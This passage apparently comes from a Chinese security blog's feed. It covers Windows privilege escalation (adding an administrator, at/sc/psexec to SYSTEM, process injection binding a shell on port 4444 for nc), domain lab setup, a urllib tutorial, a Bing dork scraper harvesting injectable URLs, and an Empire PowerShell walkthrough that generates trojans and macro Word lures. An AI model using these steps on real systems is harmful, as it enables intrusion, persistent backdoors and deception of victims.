组的权限。在权限设置中，这个组的权限是仅次于Administrators的。</li><li>Administrators<br>管理员组，默认情况下，Administrators中的用户对计算机/域有不受限制的完全访问权。分配给该组的默认权限允许对整个系统进行完全控制。一般来说，应该把系统管理员或者与其有着同样权限的用户设置为该组的成员。</li><li>Guests<br>来宾组，来宾组跟普通组Users的成员有同等访问权，但来宾账户的限制更多。</li><li>Everyone<br>所有的用户，这个计算机上的所有用户都属于这个组。</li><li>SYSTEM组<br>这个组拥有和Administrators一样甚至更高的权限，在察看用户组的时候它不会被显示出来，也不允许任何用户的加入。这个组主要是保证了系统服务的正常运行，赋予系统及系统服务的权限。</li></ul><hr><ol start="4"><li>使用命令将其加入administrators组。</li></ol><p><code>net localgroup Administrators xingqing /add</code>发生1317，用户不存在的系统错误，查资料得是因为你的用户和计算机名一样造成的，我们重新添加一hack的账户，然后继续使用上面的命令成功将hack添加到administrators组。</p><hr><ol start="5"><li>接下来使用命令将hack这个账户，提升为system权限</li></ol><p>我们打开任务管理器，查找用户为system的程序</p><ul><li>使用at命令提升为system</li></ul><p>使用范围： xp,2003使用，win7和win8，win2012,win2008已经删除。</p><p>使用<code>at /?</code>查看需要的命令参数，<code>at time /interactive cmd</code>,interactive是交互式命令行参数。whoami在windows服务器程序会有，默认的xp不存在这个命令。</p><p><img src="http://ww1.sinaimg.cn/large/006d1Stply1g35k1nnkklj31bq0n2guv.jpg" alt><br>就会使用system重新启动命令行，它的权限就是system。接下使用cmd打开的所有程序都是system权限。</p><p>接下来输入<code>taskmgr</code>使用system打开任务管理器，然后kill explore进程，最后再重新打开explore进程(文件，新建，explorer.exe),重新加载就是system权限。</p><hr><ul><li>sc命令</li></ul><p>使用范围：win7和win8，其他未测试</p><p>命令功能: 创建系统服务，SC.exe提供的功能类似于“控制面板”中“管理工具”项中的“服务”。</p><p>services.msc运行都是服务。</p><p><code>cmd /k start</code>打开一个新的窗口。</p><p><code>sc Create systemcmd binPath=&quot;cmd /k start&quot; type= own type= interact</code> 创建一个服务名字为systemcmd ,然后服务所属我自己(own)，并且是以交互的方式(可以看见，不会出现在后台)</p><p><code>sc start systemcmd</code>启动这个服务，由于所有的服务是由system启动，所以cmd会成为system权限。</p><p>1060错误未知，待解决</p><ul><li>使用微软工具提system</li></ul><p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/sysinternals/downloads/</a>，windows sysinternals解压后将psexec.exe传至xp</p><p>先打开kali ，在路径/usr/share/windows-binaries下将whoami.exe传到xp的windwos/system32文件夹中，</p><p>使用<code>psExec.exe -i -s cmd</code>。目前是失败的</p><hr><ul><li>注入进程提权</li></ul><p>找一个已经是system的服务，然后注入进程得到system权限，使用processinjector工具，放到c目录执行-l显示可以注入的进程。</p><p><img src="http://ww1.sinaimg.cn/large/006d1Stply1g35mol3ximj30n90fhn0o.jpg" alt><br>然后记住pid，然后</p><p><img src="http://ww1.sinaimg.cn/large/006d1Stply1g35msql6b1j30rh0ik44j.jpg" alt>，注入进程执行cmd程序将shell放在4444端口，等待连接。</p><p>使用kali的nc进行连接：</p><p><img src="http://ww1.sinaimg.cn/large/006d1Stply1g35mx14s8fj30sr0hntb8.jpg" alt>,直接就是system权限。<br>然后使用下载的套件sysinternals里面的Procexp.exe查看注入的进程services服务，<br><img src="http://ww1.sinaimg.cn/large/006d1Stply1g35n5xkvj0j31gd0n4ajt.jpg" alt><br>这种后门非常隐蔽。即使注销用户，服务进程依然在，后门依然可以连接。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 内网提权 - </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网域环境的搭建 (下)</title>
      <link href="/2019/05/12/nei-wang-shen-tou-huan-jing-da-jian-xia/"/>
      <url>/2019/05/12/nei-wang-shen-tou-huan-jing-da-jian-xia/</url>
      
        <content type="html"><![CDATA[<h3 id="0x02-安装域控制器的条件"><a href="#0x02-安装域控制器的条件" class="headerlink" title="0x02 安装域控制器的条件"></a>0x02 安装域控制器的条件</h3><ol><li>安装者必须具有本地管理员权限</li><li>操作系统版本必须满足条件（Windows Server 2008 除Web版外都满足）</li><li>本地磁盘至少有一个分区是NTFS文件系统</li><li>有TCP/IP设置（IP地址、子网掩码等）</li><li>有相应的DNS服务器支持</li><li>有足够的可用空间</li></ol><h3 id="0x03-域环境实战安装"><a href="#0x03-域环境实战安装" class="headerlink" title="0x03 域环境实战安装"></a>0x03 域环境实战安装</h3><ol><li>安装软件:vmware，windows2003,windows7,windows8.<br>关于vmware的三个网络连接模式简单介绍</li><li><a href="https://www.cnblogs.com/linjiaxin/p/6476480.html" target="_blank" rel="noopener">vmware三个网络模式详解</a></li></ol><h3 id="0x04-安装域控制器"><a href="#0x04-安装域控制器" class="headerlink" title="0x04 安装域控制器"></a>0x04 安装域控制器</h3><ol><li>设置windows2003为Nat，然后设置其为静态ip.</li></ol><p><img src="http://ww1.sinaimg.cn/large/006WGZFYly1g2ytjctcklj31bk0pdjuh.jpg" alt></p><ol start="2"><li>更改计算机名，win8和win10同样设置。</li></ol><p>注解：中途遇到很多坑，win8切记是企业版，win10一样。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 内网渗透 - </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网域环境搭建(上)</title>
      <link href="/2019/05/12/nei-wang-yu-huan-jing-da-jian-shang/"/>
      <url>/2019/05/12/nei-wang-yu-huan-jing-da-jian-shang/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-域环境背景知识"><a href="#0x01-域环境背景知识" class="headerlink" title="0x01 域环境背景知识"></a>0x01 域环境背景知识</h3><h4 id="1-域"><a href="#1-域" class="headerlink" title="1. 域"></a>1. 域</h4><p>将网络中多台计算机逻辑上组织到一起，进行集中管理，这种区别于工作组的逻辑环境叫做域。域是组织与存储资源的核心管理单元。在域中，至少存在一个域控制器，它保存着整个域中的用户账号和安全数据。</p><p><img src="http://ww1.sinaimg.cn/large/006WGZFYly1g2ys2ok26oj307n06lgmp.jpg" alt="域环境 "></p><hr><h4 id="2-域控制器"><a href="#2-域控制器" class="headerlink" title="2. 域控制器"></a>2. 域控制器</h4><ol><li>在域中，至少有一台DC，一般情况下一个域会有多台DC</li><li>域控制器中保存着整个域的用户帐号和安全数据库</li><li>安装有Active Directory的主机</li></ol><hr><h4 id="3-活动目录"><a href="#3-活动目录" class="headerlink" title="3. 活动目录"></a>3. 活动目录</h4><p>活动目录是Windows网络中的目录服务，提供了存储网络对象信息并使网络用户使用这些数据的方法!它的特点如下：</p><ol><li>集中管理 </li><li>便捷的网络资源访问，用户登陆一次就能访问整个网络资源，网络资源主要包含大量的对象（用户账户、组、共享文件夹、打印机等）</li></ol><h4 id="4-域的特性"><a href="#4-域的特性" class="headerlink" title="4. 域的特性"></a>4. 域的特性</h4><p>域成员计算机在登录的时候可以选择登录到域中或此计算机，登陆到域中的时候，身份验证是采用Kerberos协议在域控制器上进行的，登陆到此计算机则是通过SAM来进行NTLM验证的，如下图：<img src="http://ww1.sinaimg.cn/large/006WGZFYly1g2ysahbetgj30f109bdgh.jpg" alt></p><p>默认情况下，域用户可以登录到域中所有的工作站，不包括域控制器，管理员也可以指定具体的计算机，域用户信息保存在活动目录中，如下图：<br><img src="http://ww1.sinaimg.cn/large/006WGZFYly1g2ysibyspgj30hj0glt9b.jpg" alt></p><h4 id="5-域树和林的概念"><a href="#5-域树和林的概念" class="headerlink" title="5. 域树和林的概念"></a>5. 域树和林的概念</h4><ol><li>具有连续的域名空间的多个域</li><li>林由一个或者多个域树组成。<br><img src="http://ww1.sinaimg.cn/large/006WGZFYly1g2ysm3x5nsj30cu07mdhi.jpg" alt></li></ol><h4 id="6-组织单位"><a href="#6-组织单位" class="headerlink" title="6. 组织单位"></a>6. 组织单位</h4><p>OU（Organizational Units，组织单位），组织单位是活动目录中最小的管理单元，OU可以建立子对象，利用OU可以建立管理模型。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 内网渗透 - </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python 爬虫基本库的使用</title>
      <link href="/2019/04/13/python-pa-chong-ji-ben-ku-de-shi-yong/"/>
      <url>/2019/04/13/python-pa-chong-ji-ben-ku-de-shi-yong/</url>
      
        <content type="html"><![CDATA[<h2 id="1-urllib库"><a href="#1-urllib库" class="headerlink" title="1.urllib库"></a>1.urllib库</h2><p><code>python3</code>中将<code>python2</code>中的<code>urllib</code>和<code>urllib2</code>两个库统一起来，统一为<code>urllib</code>库，它分为四个模块。</p><p><code>request</code>:发送<code>HTTP</code>请求的模块。</p><p><code>error</code>:异常处理模块，如果出现请求异常，可以获得异常并且进行处理</p><p><code>parse</code>: 提供对<code>URL</code>处理方法，拆分、解析、合并等。</p><p><code>robotparser</code>:用来识别网站的<code>robots.txt</code>文件，然后判断哪些网站可以爬，那些不可爬。</p><h2 id="2-request发送请求模块"><a href="#2-request发送请求模块" class="headerlink" title="2. request发送请求模块"></a>2. request发送请求模块</h2><p><code>request</code>模块可以模拟浏览器发出<code>HTTP</code>请求，同时带有处理授权验证、重定向、<code>cookies</code>以及其他内容。</p><h3 id="2-1-urlopen"><a href="#2-1-urlopen" class="headerlink" title="2.1 urlopen()"></a>2.1 urlopen()</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">response=urllib.request.urlopen(<span class="string">'http://www.baidu.com'</span>)</span><br><span class="line">print(response.read().decode(<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line">print(type(response))</span><br><span class="line">print(response.getheaders())</span><br><span class="line">print(response.status)</span><br><span class="line">print(response.getheader(<span class="string">'Server'</span>))</span><br></pre></td></tr></table></figure><p>通过上面代码可以对网站进行<code>http</code>请求，将获得的相应存储在<code>response</code>里面，<code>response</code>是一个<code>HTTPResponse</code>对象，主要包含<code>read()</code>、<code>readinto()</code>、<code>getheader(name)</code>、<code>getheaders()</code>、<code>fileno()</code>等方法，以及<code>msg</code>、<code>version</code>、<code>status</code>等属性，<code>type(response)</code>将显示出<code>response</code>的属性，</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;class &apos;http.client.HTTPResponse&apos;&gt;</span><br></pre></td></tr></table></figure><p><strong>注意：response.getheaders() 返回头部所有的信息，然后resopnse.gethead(‘name’)是返回指定的头部名称信息，它没有S。</strong></p><p>函数的格式：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">urllib.request.urlopen(url, data=None, [timeout, ]*, cafile=None, capath=None, cadefault=False, context=None)</span><br></pre></td></tr></table></figure><p>参数说明：</p><p><code>data</code>是<code>post</code>传值的数据，可以传递表单</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(urllib.parse.urlencode(&#123;<span class="string">'name'</span>:<span class="string">'qin'</span>&#125;))</span><br></pre></td></tr></table></figure><p><code>urllib.parse.urlencode</code>是将字典转换成字符串，最后变成</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name=qin,data = bytes(urllib . parse . urlencode(&#123;<span class="string">'word ’:’ hello'</span>&#125;), encoding ＝’ ut <span class="number">8</span><span class="string">')</span></span><br></pre></td></tr></table></figure><p><code>timeout</code>参数:</p><p>用来设置超时时间，单位是秒，支持<code>ftp</code>,<code>http</code>,<code>https</code>请求</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> urllib.error</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response=urllib.request.urlopen(<span class="string">'****'</span>,timeout=<span class="number">0.1</span>)</span><br><span class="line"><span class="keyword">except</span> urllib.error.URLError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">if</span> isinstance(e.reason,socket.timeout):</span><br><span class="line">       print(<span class="string">'TIME OUT'</span>)</span><br></pre></td></tr></table></figure><p>其他参数:</p><p><code>context</code>是指定<code>ssl</code>设置的，<code>cafile</code>和<code>capath</code>是指定证书和路径的。</p><h3 id="2-2-使用Request对象来发出请求"><a href="#2-2-使用Request对象来发出请求" class="headerlink" title="2.2. 使用Request对象来发出请求"></a>2.2. 使用Request对象来发出请求</h3><p>因为<code>urlopen()</code>可以实现最基本的请求，但是不足用来构建一个完整的请求。如果加入<code>Headers</code>等信息，需要利用更加强大的<code>Request</code>类</p><p><code>Request</code>对象：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class urllib.request.Request(ur1,data=None,headers=&#123;&#125;,origin_req_host=None,unverifiable=False,method=None)</span><br></pre></td></tr></table></figure><p><code>url</code>是必传参数，<code>data</code>可选，必须是字节流使用<code>bytes</code>类型，字典的话得用<code>urllib.parse</code>模块的<code>urlencode()</code>编码，第三个参数<code>headers</code>是字典，是请求头，<code>origin_req_host</code>是请求方的<code>ip</code>或者<code>host</code>名称，第六个是<code>method</code>,<code>get</code>、<code>post</code>等</p><p>实例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request,parse</span><br><span class="line">url=<span class="string">'http://httpbin.org/post'</span></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/4.0(compatible;MSIE 5-5;Windows NT'</span>,</span><br><span class="line">    <span class="string">'Host'</span>:<span class="string">'httpbin.org'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dict=&#123;</span><br><span class="line">    <span class="string">'name'</span>:<span class="string">'qinjian'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data=bytes(parse.urlencode(dict),encoding=<span class="string">'utf8'</span>)</span><br><span class="line">req=request.Request(url=url,data=data,headers=headers,method=<span class="string">'POST'</span>)</span><br><span class="line">response=request.urlopen(req)</span><br><span class="line">print(response.read().decode(<span class="string">'utf-8'</span>))</span><br><span class="line">headers也可以使用add_header()方法来添加：</span><br><span class="line"></span><br><span class="line">req=request.Request(url=url,data=data,method=<span class="string">'POST'</span>)</span><br><span class="line">req.add_header(<span class="string">'User-Agent'</span>,<span class="string">'Mozilla/4.0(compatible;MSIE 5-5;Windows NT'</span>)</span><br></pre></td></tr></table></figure><h3 id="2-3-高级用法"><a href="#2-3-高级用法" class="headerlink" title="2.3 高级用法"></a>2.3 高级用法</h3><p><code>handle</code>用来处理登陆验证的，可以代理设置也可以处理<code>cookie</code>。</p>]]></content>
      
      
      
        <tags>
            
            <tag> python爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bing批量采集URL去重复链接脚本</title>
      <link href="/2019/04/12/bing-pi-liang-cai-ji-url-qu-chong-fu-lian-jie-jiao-ben/"/>
      <url>/2019/04/12/bing-pi-liang-cai-ji-url-qu-chong-fu-lian-jie-jiao-ben/</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- conding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">logo = <span class="string">'''</span></span><br><span class="line"><span class="string">  _______    ___     ___    _      </span></span><br><span class="line"><span class="string"> |__   __|  / _ \   / _ \  | |     </span></span><br><span class="line"><span class="string">    | |    | | | | | | | | | |  ___</span></span><br><span class="line"><span class="string">    | |    | | | | | | | | | | / __|</span></span><br><span class="line"><span class="string">    | |    | |_| | | |_| | | | \__ \\</span></span><br><span class="line"><span class="string">    |_|     \___/   \___/  |_| |___/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span>  </span><br><span class="line">print(logo)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Obtain_url</span><span class="params">(page_number,your_url)</span>:</span> <span class="comment">#爬抓bing获取url</span></span><br><span class="line">    browser = ChromeDriverNOBrowser()</span><br><span class="line">    browser.implicitly_wait(<span class="number">100</span>)</span><br><span class="line">    page = [<span class="string">'&amp;first='</span>+str(i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,page_number,<span class="number">10</span>)]</span><br><span class="line">    crux =your_url</span><br><span class="line">    crux = urllib.parse.quote(crux)   <span class="comment">#解决编码报错问题</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'url.txt'</span>, <span class="string">'a'</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        count_page=<span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> page:</span><br><span class="line">            print(<span class="string">'正在爬取第'</span>+str(count_page)+<span class="string">'页:'</span>)</span><br><span class="line">            count_page=count_page+<span class="number">1</span></span><br><span class="line">            current_url=<span class="string">'https://cn.bing.com/search?q='</span>+crux+i</span><br><span class="line">            print(current_url)</span><br><span class="line">            browser = webdriver.Chrome()</span><br><span class="line">            browser.get(current_url)</span><br><span class="line">            content=browser.page_source</span><br><span class="line">            res = re.compile(<span class="string">r'&lt;h2&gt;&lt;a target="_blank" href="(.*?)"'</span>)</span><br><span class="line">            data = res.findall(content)</span><br><span class="line">            print(data)</span><br><span class="line">            <span class="keyword">if</span> len(data)==<span class="number">0</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> data:</span><br><span class="line">                print(j)</span><br><span class="line">                f.write(j+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ChromeDriverNOBrowser</span><span class="params">()</span>:</span></span><br><span class="line">    chrome_options = webdriver.ChromeOptions()</span><br><span class="line">    chrome_options.add_argument(<span class="string">'--headless'</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">'--disable-gpu'</span>)</span><br><span class="line">    driverChrome = webdriver.Chrome(chrome_options=chrome_options)</span><br><span class="line">    <span class="keyword">return</span> driverChrome</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">url</span><span class="params">()</span>:</span>  <span class="comment">#处理bing爬抓下来的链接</span></span><br><span class="line">    url = []</span><br><span class="line">    print(<span class="string">'链接处理'</span>)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'result.txt'</span>,<span class="string">'r'</span>,encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:  <span class="comment">#读取文件内容到列表里</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">            url.append(i)</span><br><span class="line">    data = list(set(url))  <span class="comment">#去重url列表</span></span><br><span class="line">    data = sorted(data)    <span class="comment">#排列顺序</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'new_url.txt'</span>,<span class="string">'a'</span>,encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:  <span class="comment">#判断url是否有.php? .asp? .aspx?</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">            res = re.compile(<span class="string">r'\.php\?'</span>)</span><br><span class="line">            datas = res.findall(i)</span><br><span class="line">            <span class="keyword">if</span> datas != []:</span><br><span class="line">                f.write(i)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res = re.compile(<span class="string">r'\.asp\?'</span>)</span><br><span class="line">                datas = res.findall(i)</span><br><span class="line">                <span class="keyword">if</span> datas != []:</span><br><span class="line">                    f.write(i)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    res = re.compile(<span class="string">r'\.aspx\?'</span>)</span><br><span class="line">                    datas = res.findall(i)</span><br><span class="line">                    <span class="keyword">if</span> datas != []:</span><br><span class="line">                        f.write(i)</span><br><span class="line"></span><br><span class="line">year = time.localtime().tm_year</span><br><span class="line">mon = time.localtime().tm_mon</span><br><span class="line">day = time.localtime().tm_mday</span><br><span class="line">hour = time.localtime().tm_hour</span><br><span class="line">min = time.localtime().tm_min</span><br><span class="line">sec = time.localtime().tm_sec</span><br><span class="line">nowtime = str(year) + str(mon) + str(day) + str(hour) + str(min) + str(sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">openThefile</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    1、打开要去重的文件</span></span><br><span class="line"><span class="string">    2、删除每行数据前后的无用字符</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    f=<span class="string">"new_url.txt"</span></span><br><span class="line">    ff = open(f,<span class="string">'r'</span>)</span><br><span class="line">    l = []</span><br><span class="line">    <span class="comment">#for i in ff.readline():     #readline是文件中的第一行内容</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ff.readlines():    <span class="comment">#所有内容中的每一行</span></span><br><span class="line">        <span class="keyword">if</span> i != <span class="string">'\n'</span> <span class="keyword">and</span> i != <span class="string">'\r\n'</span>:   <span class="comment">#删除空行</span></span><br><span class="line">            ii = i.replace(<span class="string">'\t'</span>,<span class="string">''</span>).strip()</span><br><span class="line">            l.append(ii)</span><br><span class="line">    ff.close()</span><br><span class="line">    <span class="keyword">return</span> l</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createNewfile</span><span class="params">(openThefile)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    去重操作</span></span><br><span class="line"><span class="string">    :param openThefile:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    l = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> openThefile:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> l:</span><br><span class="line">            l.append(i)</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    创建新文件</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    f=<span class="string">"new_url.txt"</span></span><br><span class="line">    filename = f[:f.find(<span class="string">'.'</span>)]</span><br><span class="line">    postfix = f[f.find(<span class="string">'.'</span>):]</span><br><span class="line">    theNewfile = open(filename + <span class="string">'_'</span> + nowtime + postfix,<span class="string">'a'</span>)</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    写入处理过的内容</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">        theNewfile.writelines(i+<span class="string">'\n'</span>)</span><br><span class="line">    theNewfile.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    parser=argparse.ArgumentParser()</span><br><span class="line">    parser.description=<span class="string">'自动化采集bing网站的爬虫'</span></span><br><span class="line">    parser.add_argument(<span class="string">'-u'</span>,<span class="string">'--your_url'</span>,help=<span class="string">"你的hack语句"</span>,type=str)</span><br><span class="line">    parser.add_argument(<span class="string">'-p'</span>,<span class="string">'--page_number'</span>,help=<span class="string">"你要爬取的页数最大范围"</span>,type=int)</span><br><span class="line">    args=parser.parse_args()</span><br><span class="line">    Obtain_url(args.page_number,args.your_url)</span><br><span class="line">    url()</span><br><span class="line">    createNewfile(openThefile())</span><br></pre></td></tr></table></figure><p>调试了半天了，提前装好<code>selenium</code>库和谷歌浏览器的驱动，使用方法例如：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python 1.py -u inurl:php?id -p 100</span><br></pre></td></tr></table></figure><p>意思是使用谷歌关键字<code>inurl:php?id</code>然后爬取<code>100/10</code>以内的页数</p>]]></content>
      
      
      
        <tags>
            
            <tag> python黑客编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Empire-powershell渗透攻击框架工具</title>
      <link href="/2019/04/12/empire-powershell-shen-tou-gong-ji-kuang-jia-gong-ju/"/>
      <url>/2019/04/12/empire-powershell-shen-tou-gong-ji-kuang-jia-gong-ju/</url>
      
        <content type="html"><![CDATA[<h2 id="1-工具简介"><a href="#1-工具简介" class="headerlink" title="1. 工具简介"></a>1. 工具简介</h2><p><code>Empire</code>是一款针对<code>windows</code>平台的、使用<code>Powershell</code>脚本作为攻击载荷的渗透攻击框架工具，具有从<code>stager</code>生成、提权到渗透维持的一系列功能。<code>Empire</code>实现不需要<code>powershell.exe</code>就可以运行的<code>Powershell</code>代理功能，内置键盘记录、<code>Mimikatz</code>(提权，获取<code>hash</code>等)、绕过<code>UAC</code>、内网扫描等，并且能避免网络检测和大部分安全防护软件的查杀，总之就是一个基于<code>Powershell</code>的远程控制木马。具体可以参考官网</p><p><code>http://www.powershellempire.com/</code></p><h2 id="2-工具安装"><a href="#2-工具安装" class="headerlink" title="2. 工具安装"></a>2. 工具安装</h2><p><code>kali linux</code>下命令行从<code>github</code>将其下载下来</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/EmpireProject/Empire.git</span><br></pre></td></tr></table></figure><p>然后进入<code>Empire</code>的<code>setup</code>目录安装<code>Empire</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd Empire</span><br><span class="line">cd setup</span><br><span class="line">sudo ./install.sh</span><br></pre></td></tr></table></figure><p>安装完成后打开<code>empire</code>，首先进入<code>Empire</code>目录</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./empire</span><br></pre></td></tr></table></figure><p>启动<code>empire</code></p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g21bsvyl51j30lx0g5n5w.jpg" alt></p><p>它和<code>msf</code>有着一样的原理，在<code>Kali</code>上设置一个端口监听反弹回来的木马连接，生成<code>powershell</code>木马在目标主机运行就会拿到<code>shell</code>。</p><h3 id="2-1-设置监听"><a href="#2-1-设置监听" class="headerlink" title="2.1 设置监听"></a>2.1 设置监听</h3><p>首先运行<code>help</code>，查看可使用的命令菜单。</p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g21bsw1ceuj30m90fzgw2.jpg" alt></p><p>接着输入<code>listeners</code>进入<code>listeners</code>模块，在使用<code>uselistener</code>设置采用何种模式，通过双击<code>Tab</code>键就可以展开模式</p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g21bsw1q2jj30md0fvwnn.jpg" alt></p><p>前面是我实验建立的<code>lisener</code>，然后我们使用<code>userlistener http</code>使用<code>http</code>模式，然后输入<code>info</code>查看需要设置那些信息，和<code>msf</code>里面的<code>show options</code>异曲同工</p><p>然后再使用<code>set</code>设置参数，这里的<code>host</code>设置主机名：端口，也就是你攻击机器的<code>ip</code>，最后<code>execute</code>执行监听，执行完后，我们使用返回<code>back</code>命令，再<code>list</code>我们已经设置的监听。</p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g21bsw4oztj30m60gadpz.jpg" alt></p><p>使用<code>kill</code>可以杀掉已经设置的监听</p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g21bsw09kjj30m70g2wof.jpg" alt></p><h3 id="2-2-生成木马"><a href="#2-2-生成木马" class="headerlink" title="2.2 生成木马"></a>2.2 生成木马</h3><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g21bsw3ad1j30m70gd13p.jpg" alt></p><p>使用<code>usestager</code>加上空格和<code>Tab</code>键得到可以设置的木马格式，有<code>dll</code>，<code>bat</code>，<code>jar</code>等格式的木马，我们先使用一个简单的木马，首先返回到<code>listeners</code>下，然后使用<code>launcher language listenername</code>很快生成一行<code>base64</code>编码的代码，如图所示</p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g21bsw2tn8j30m70g2n8t.jpg" alt></p><p>然后复制粘贴我们的木马代码，直接再你要攻击的主机上的<code>cmd</code>下执行，我的电脑装的是火绒安全软件，并没有做出拦截。再<code>cmd</code>直接粘贴代码，会发现<code>cmd</code>一闪而过，接着你的木马已经上线。</p><p><img src alt></p><p>接下来输入<code>agents</code>就可以看到所有控制的主机了，我们可以使用:<code>rename 旧名字 新名字</code>给主机的控制进行重新命名。</p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g21bsw2ngrj30m70fygv6.jpg" alt> </p><p>使用<code>interact test2</code>就可以开始对我们控制的主机做坏事了，然后使用<code>help</code>就可以找到控制的功能</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell ipconfig</span><br></pre></td></tr></table></figure><p>执行<code>cmd</code>下的<code>ipconfig</code>，查看网络配置</p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g21bsw1r1hj30ly0gr48p.jpg" alt></p><p>接下来我们使用<code>launcher_vbs</code>木马试试，输入 </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">usestager windows/launcher_vbs</span><br></pre></td></tr></table></figure><p>输入<code>info</code>查看配置的参数，设置<code>listener</code>为生成的<code>listener</code></p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g21bsw43kcj30lt0fwtis.jpg" alt></p><p>将其从<code>tmp</code>目录<code>copy</code>到<code>windows</code>主机双击，火绒又没拦截，主机上线。</p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g21bsuv2amj30mn07275c.jpg" alt></p><p>生成<code>macro</code>木马插入<code>word</code>文档，增加迷惑性 </p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g21bsv3k0bj31b70p9dhx.jpg" 